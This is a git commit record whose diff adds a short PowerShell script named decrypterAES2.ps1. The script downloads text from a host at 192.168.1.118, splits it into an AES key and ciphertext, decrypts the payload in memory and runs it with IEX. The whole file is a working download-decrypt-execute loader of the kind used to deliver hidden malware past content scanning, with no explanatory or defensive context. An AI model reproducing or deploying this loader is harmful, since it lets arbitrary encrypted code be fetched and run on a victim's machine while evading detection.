17479ee19e4625e7df1052fb9f6c0e978679b705
DenFox93 <volpe.daniele93@gmail.com>
2021-01-22 16:47:29 +0100

    Create decrypterAES2.ps1

---
+++ decrypterAES2.ps1
@@ -0,0 +1,16 @@
+$file=(New-Object Net.WebClient).downloadstring('http://192.168.1.118/file ');
+$key=$file.substring(0,44);
+$bytes=[System.Convert]::FromBase64String($file.substring(44));
+$IV = $bytes[0..15];
+$aes = New-Object "System.Security.Cryptography.AesManaged";
+$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC;
+$aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros;
+$aes.BlockSize = 128;
+$aes.KeySize = 256;
+$aes.IV = $IV;
+$aes.Key = [System.Convert]::FromBase64String($key);
+$decryptor = $aes.CreateDecryptor();
+$unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
+$aes.Dispose();
+$backToPlainText=[System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0);
+IEX($backToPlainText);
